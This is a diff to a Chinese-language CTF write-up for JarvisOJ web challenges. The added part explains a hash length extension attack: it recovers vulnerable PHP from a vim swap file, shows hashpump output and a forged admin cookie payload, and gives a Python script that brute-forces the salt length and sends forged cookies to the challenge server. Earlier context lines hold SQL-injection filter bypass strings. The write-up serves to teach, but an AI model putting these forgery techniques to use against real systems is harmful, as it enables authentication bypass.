@@ -4,9 +4,10 @@
 
 [例题:JarvisOJ PORT51](http://web.jarvisoj.com:32770/)
 
-curl 参数 --local-port RANGE  强制使用的本地端口号
+`curl 参数 --local-port RANGE  强制使用的本地端口号`
 
 ***payload***
+
 `curl --local-port 51 http://web.jarvisoj.com:32770/`
 
 (在做题的时候貌似出了问题 没有回显)
@@ -60,7 +61,7 @@ ascii: 'or'6É]é!r,ùíb
 
 得到空白页面，查看源代码
 
-```
+```php
 <?php
 	$f = $_GET['img'];
 	if (!empty($f)) {
@@ -81,7 +82,7 @@ ascii: 'or'6É]é!r,ùíb
 
 查看源代码
 
-```
+```php
 <?php 
 	require_once('shield.php');
 	$x = new Shield();
@@ -94,7 +95,7 @@ ascii: 'or'6É]é!r,ùíb
 ```
 
 查看shield.php源代码
-```
+```php
 <?php
 	//flag is in pctf.php
 	class Shield {
@@ -131,7 +132,7 @@ flag在源代码中
 
 提示查看 index.phps 
 
-```
+```php
 <?php
 
 error_reporting(0);
@@ -167,7 +168,7 @@ else
    
    当php进行一些数学计算的时候，有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。
 
-   ```
+   ```php
    #!php
 	var_dump(0 == '0'); // true
 	var_dump(0 == 'abcdefg'); // true  
@@ -239,3 +240,148 @@ else
 查找title中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,title/*123*/ffromrom/*123*/content`
 返回hi666
 
+### hash长度拓展攻击 ###
+[例题:JarvisOJ flag在管理员手里](http://web.jarvisoj.com:32778/)
+
+打开网页，发现`Only Admin can see the flag!!`
+
+在burpsuite中发现
+
+`Cookie	role s:5:"guest"`
+
+`Cookie	hsah 3a4727d57463f122833d9e732f94e4e0"`
+
+猜测跟hash有关，无其他发现，尝试暴力扫描
+
+在御剑中发现了index.php的vim swap file
+
+通过`vim -r index.php.swp`将其还原
+
+```php
+<!DOCTYPE html>
+<html>
+<head>
+<title>Web 350</title>
+<style type="text/css">
+   body {
+      background:gray;
+      text-align:center;
+   }
+</style>
+</head>
+
+<body>
+   <?php
+      $auth = false;
+      $role = "guest";
+      $salt =
+      if (isset($_COOKIE["role"])) {
+         $role = unserialize($_COOKIE["role"]);
+         $hsh = $_COOKIE["hsh"];
+         if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
+            $auth = true;
+         } else {
+            $auth = false;
+         }
+      } else {
+         $s = serialize($role);
+         setcookie('role',$s);
+         $hsh = md5($salt.strrev($s));
+         setcookie('hsh',$hsh);
+      }
+      if ($auth) {
+         echo "<h3>Welcome Admin. Your flag is 
+      } else {
+         echo "<h3>Only Admin can see the flag!!</h3>";
+      }
+   ?>
+```
+
+关键在于`$role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"])`
+
+现在知道md5(salt+;”tseug”:5:s)，需要计算md5(salt+;”nimda”:5:s)。因此可以用[哈希长度扩展攻击](https://www.smi1e.top/hello-world/)。即可以计算出md5(salt+;”tseug”:5:s+填充的字节+;”nimda”:5:s)，倒序后的role值是s:5:”admin”;+逆序的填充字节+s:5:”guest”;。php在反序列化时会忽略第一个可序列化后对象之后的字符串。
+
+```php
+$array1 = array('a' => 1);
+$array2 = array('b' => 'test');
+$s = serialize($array1)."pad".serialize($array2);
+print_r($s);
+print_r(unserialize($s));
+```
+
+```php
+a:1:{s:1:"a";i:1;}pada:1:{s:1:"b";s:4:"test";}
+Array
+(
+    [a] => 1
+)
+```
+
+注意要将`\x`转换为`%`，同时`;`要转换为`%3b`。此时尚不清楚salt的长度，假设为10，使用hashpump进行尝试
+
+```
+Input Signature: 3a4727d57463f122833d9e732f94e4e0
+Input Data: ;"tseug":5:s
+Input Key Length: 10
+Input Data to Add: ;"nimda":5:s
+fcdc3840332555511c4e4323f6decb07
+;"tseug":5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;"nimda":5:s
+```
+
+当长度为12时得到flag
+
+```
+Input Signature: 3a4727d57463f122833d9e732f94e4e0
+Input Data: ;"tseug":5:s
+Input Key Length: 12
+Input Data to Add: ;"nimda":5:s
+fcdc3840332555511c4e4323f6decb07
+;"tseug":5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;"nimda":5:s
+```
+
+此时的payload为 `role=s:5:"admin"%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s:5:"guest"%3b; hsh=fcdc3840332555511c4e4323f6decb07`
+
+另一种方法为使用[爆破脚本](https://skysec.top/2017/08/16/jarvisoj-web/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C)
+```python
+# -*- coding:utf-8 -*-
+from urlparse import urlparse
+from httplib import HTTPConnection
+from urllib import urlencode
+import json
+import time
+import os
+import urllib
+
+def gao(x, y):
+        #print x
+        #print y
+    url = "http://web.jarvisoj.com:32778/index.php"
+    cookie = "role=" + x + "; hsh=" + y
+        #print cookie
+    build_header = {
+            'Cookie': cookie,
+            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0',
+            'Host': 'web.jarvisoj.com:32778',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    }
+    urlparts = urlparse(url)
+    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
+    conn.request("GET", urlparts.path, '', build_header)
+    resp = conn.getresponse()
+    body = resp.read()
+    return body
+
+for i in xrange(1000):
+    print i
+    # secret len = ???
+    find_hash = "./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet"
+    #print find_hash
+    calc_res = os.popen(find_hash).readlines()
+    hash_value = calc_res[0][:32]
+    attack_padding = calc_res[0][32:]
+    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
+    ret = gao(attack_padding, hash_value)
+    if "Welcome" in ret:
+        print ret
+        break
+```
